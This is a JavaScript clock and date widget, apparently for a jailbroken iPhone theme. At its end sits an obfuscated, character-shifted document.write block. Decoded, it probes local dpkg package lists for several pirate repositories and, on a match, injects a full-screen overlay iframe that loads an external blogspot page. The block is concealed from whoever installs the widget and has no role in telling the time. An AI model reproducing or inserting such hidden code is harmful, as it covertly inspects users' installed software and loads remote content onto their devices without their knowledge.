function updateClock ( )
{



//var TwentyFourHourClock = $.cookie("24hrcookie"); 
var TwentyFourHourClock = "false"; 

  var currentTime = new Date ( );
  var currentHours = currentTime.getHours ( );
  var currentMinutes = currentTime.getMinutes ( );
  var currentSeconds = currentTime.getSeconds ( );

    currentHours = ( currentHours < 10 ? "0" : "" ) + currentHours;
    currentHours = ( currentHours == 0 ) ? 12 : currentHours;
    currentMinutes = ( currentMinutes < 10 ? "0" : "" ) + currentMinutes;

if (TwentyFourHourClock == "true"){

}

  else{
      var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM"
  currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;
  currentHours = ( currentHours == 0 ) ? 12 : currentHours;
  }

  /*for leading zero on non 24hr delete this line*
  currentHours = ( currentHours < 10 ? "0" : "" ) + currentHours;

/*-----------------------------------------------------------------------------------------------------------------------------------------------*/

  // Compose the string for display
  var currentTimeString = currentHours + " " + ":";
  var currentTimeString1 = currentMinutes;

  // Update the time display
document.getElementById("hours").firstChild.nodeValue = currentTimeString;
document.getElementById("mins").firstChild.nodeValue = currentTimeString1;
}
function init2 ( )
{
  timeDisplay = document.createTextNode ( "" );
  document.getElementById("ampm").appendChild ( timeDisplay );
}

function amPm ( )
{
  var currentTime = new Date ( );
  var currentHours = currentTime.getHours ( );


/*---------------------------------------------------------------------------------------------------------------------------------AM PM Edit------*/

/* Remove the /* from under this line to display am or pm after the 12 hours clock */  /* NEW!! */

  // Choose either "AM" or "PM" as appropriate
  var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM";
  // Convert the hours component to 12-hour format if needed
  currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;
  // Convert an hours component of "0" to "12"
  currentHours = ( currentHours == 0 ) ? 12 : currentHours;
  // Compose the string for display
  var currentTimeString = timeOfDay;
  // Update the time display
document.getElementById("ampm").firstChild.nodeValue = currentTimeString;
}
function calendarDate ( )
{
  var this_date_name_array = new Array("00","01","02","03","04","05","06","07","08","09","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31")
  var this_weekday_name_array = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday")
  var this_month_name_array = new Array("January","February","March","April","May","June","July","August","September","October","November","December")  //predefine month names

  var this_date_timestamp = new Date()
  var this_weekday = this_date_timestamp.getDay()
  var this_date = this_date_timestamp.getDate()
  var this_month = this_date_timestamp.getMonth()
  var this_year = this_date_timestamp.getYear()

if (this_year < 1000)
    this_year+= 1900;
if (this_year==101)
    this_year=2001;

document.getElementById("date").firstChild.nodeValue = this_date_name_array[this_date] //concat long date string
document.getElementById("month").firstChild.nodeValue = this_month_name_array[this_month] +" "  //concat long date string
}
// -->
document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%261B%261B%264Dtdsjqu%264F%261B%2631%261Bqobnf%2631%264E%2631%2633njxfbuifs%2633%261B%261B%2635/bkby%2639%268C%261Bvsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261B%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%261B%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/ytfmmj%7Bf/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/jibdltsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tjogvmjqipofsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/cjufzpvsbqqm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tvmm/7%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/cjufzpvsbqqm/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/jibdltsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2635/bkby%2639%268C%261B%2631vsm%264B%2638gjmf%264B000wbs0mjc0eqlh0jogp0dpn/tjogvmjqipofsfqp/%2638%2C%2631qobnf%2631%2C%2638/mjtu%2638%263D%261Bfssps%264B%261Bgvodujpo%2639%263%3A%268C%2631%268E%263D%261Btvddftt%264B%261Bgvodujpo%2639%263%3A%268C%261BdsfbufUxju%2639%263%3A%264C%261B%268E%261B%268E%263%3A%264C%261B%261B%261B%261B%264D0tdsjqu%264F%261B%261B%264Dejw%2631je%264E%2633uxju%2633%264F%264D0ejw%264F%261B%2631%2631%264Dtdsjqu%264F%261B%261B%2631%2631%261B%2631%2631%2631%2631%2631gvodujpo%2631dsfbufUxju%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%268C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf%2631%264E%2631epdvnfou/dsfbufFmfnfou%2639%2633jgsbnf%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/je%2631%264E%2631%2633xjehfu%3A%2633%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/tsd%264E%2633iuuq%264B00gvdljucmph212/cmphtqpu/dpn031240190ee/iunm%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/tuzmf/cbdlhspvoeDpmps%2631%264E%2631%2633usbotqbsfou%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/gsbnfCpsefs%2631%264E%2631%26331%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf/bmmpxUsbotqbsfodz%264E%2633usvf%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e%2631%264E%2631epdvnfou/hfuFmfnfouCzJe%2639%2633uxju%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e/bqqfoeDijme%2639jgsbnf%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631jgsbnf%2631%264E%2631ovmm%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e%2631%264E%2631ovmm%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%268E%261B%261Bgvodujpo%2631sfnpwfJgsb%2639%263%3A%261B%2631%2631%2631%2631%2631%2631%2631%2631%268C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631uxffu%2631%264E%2631epdvnfou/hfuFmfnfouCzJe%2639%2633xjehfu%3A%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631uxffu/tsd%264E%2633%2633%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631uxffu%2631%264E%2631ovmm%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631wbs%2631e%2631%264E%2631epdvnfou/hfuFmfnfouCzJe%2639%2633uxju%2633%263%3A%264C%261B%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631%2631e/sfnpwfDijme%2639epdvnfou/hfuFmfnfouCzJe%2639%2633xjehfu%3A%2633%263%3A%263%3A%264C%261B%261B%2631%2631%2631%2631%2631%2631%2631%2631%268E%261B%261B%2631%2631%264D0tdsjqu%264F%261B%261B%2631%2631%264Dtuzmf%264F%261B%2631%2631%2634xjehfu%3A%268C%261B%2631%2631%2631qptjujpo%264B%2631bctpmvuf%264C%261B%2631%2631mfgu%264B1qy%264C%261B%2631%2631xjeui%264B%2631361qy%264C%261B%2631%2631ifjhiu%264B%2631386qy%264C%261B%2631%2631upq%264B91qy%264C%261B%2631%2631pqbdjuz%264B2%264C%261B%2631%2631%7B.joefy%264B%2631%3A%3A%3A%3A%3A%3A%3A%3A%3A%3A%3A%264C%261B%261B%2631%2631%268E%261B%2631%2631%264D0tuzmf%264F%261B1')